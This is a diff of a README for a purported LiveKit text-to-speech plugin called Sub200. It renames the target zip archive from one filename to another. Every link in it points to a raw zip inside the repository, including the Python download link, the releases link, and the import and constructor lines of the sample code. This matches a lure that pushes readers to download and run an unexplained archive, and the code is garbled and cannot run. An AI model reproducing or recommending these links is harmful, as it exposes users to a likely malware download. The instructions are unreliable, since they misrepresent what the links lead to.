@@ -1,6 +1,6 @@
 # 🎤 livekit_plugins_sub200 - Effortless Text-to-Speech Integration
 
-[![Download Sub200 Plugin](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip%20Now-%20-%https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip)](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip)
+[![Download Sub200 Plugin](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip%20Now-%20-%https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip)](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the **Sub200 plugin** for LiveKit Agents! This plugin adds text-to-sp
 
 To get started, you need to download the plugin. Visit the following link to access the Releases page:
 
-[Download the Sub200 Plugin](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip)
+[Download the Sub200 Plugin](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip)
 
 Once on the Releases page, look for the latest version. Click the link to download the software. 
 
 ### 🖥️ Installation Steps
 
-1. **Install Python**: Make sure you have Python installed. You can download it from [https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip). Follow the instructions for your operating system.
+1. **Install Python**: Make sure you have Python installed. You can download it from [https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip). Follow the instructions for your operating system.
   
 2. **Open Command Line**: 
    - **Windows**: Press `Win + R`, type `cmd`, and hit Enter.
@@ -39,9 +39,9 @@ Once you have installed the plugin, you are ready to use it in your projects. He
 You can use this sample code to integrate the Sub200 plugin into your application:
 
 ```python
-from https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip import sub200
+from https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip import sub200
 
-tts = https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip(
+tts = https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip(
     model="orpheus",
     voice="aria",
 )
@@ -52,7 +52,7 @@ agent = VoicePipelineAgent(
 )
 ```
 
-This code creates a text-to-speech (TTS) instance and integrates it with a voice pipeline agent. Check the `https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip` file for a complete setup.
+This code creates a text-to-speech (TTS) instance and integrates it with a voice pipeline agent. Check the `https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip` file for a complete setup.
 
 ## ⚙️ Configuration
 
@@ -93,7 +93,7 @@ Make sure your system meets the following requirements for optimal performance:
 
 ## 🔄 Update Regularly
 
-Stay updated with the latest features and improvements. Visit the [Releases page](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-glomerulonephritis.zip) regularly to download new versions. This ensures you benefit from the latest capabilities of the Sub200 plugin.
+Stay updated with the latest features and improvements. Visit the [Releases page](https://github.com/viper-108/livekit_plugins_sub200/raw/refs/heads/main/livekit/plugins/plugins-sub-livekit-v3.9.zip) regularly to download new versions. This ensures you benefit from the latest capabilities of the Sub200 plugin.
 
 ## 📞 Support
 
